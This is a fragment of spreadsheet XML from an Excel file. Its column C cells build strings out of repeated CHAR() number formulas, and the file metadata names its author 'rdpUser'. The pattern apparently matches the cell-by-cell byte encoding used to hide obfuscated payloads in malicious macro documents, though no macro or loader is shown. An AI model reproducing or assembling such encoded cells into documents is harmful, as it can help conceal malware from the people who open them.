        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="1008" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1008" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="1009" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1009" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="1010" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1010" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="1011" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1011" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="1012" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1012" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="1013" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1013" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="1014" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1014" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="1015" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1015" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="1016" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1016" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="1017" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1017" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="1018" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1018" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="1019" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1019" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="1020" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1020" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="1021" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1021" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="1022" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1022" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="1023" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1023" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)</f>
        <v>ô6Í</v>
      </c>
    </row>
    <row r="1024" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1024" t="s"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BD61-5E68-4271-A428-C4BEAB7CBC54}">
  <dimension ref="A1"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C35" sqref="C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rdpUser</dc:creator>
  <cp:lastModifiedBy>rdpUser</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-03-01T23:24:58Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-03-01T23:28:30Z</dcterms:modified>
</cp:coreProperties>
</file>